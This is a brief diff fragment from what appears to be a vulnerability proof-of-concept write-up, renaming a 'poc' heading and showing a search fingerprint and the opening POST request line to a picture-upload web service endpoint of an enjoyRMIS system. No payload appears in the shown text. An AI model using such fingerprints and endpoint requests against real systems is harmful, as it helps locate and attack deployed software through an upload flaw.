@@ -8,7 +8,7 @@
 body="/ClientBin/slEnjoy.App.xap"
 ```
 
-## poc
+## POC
 
 ```xml
 POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
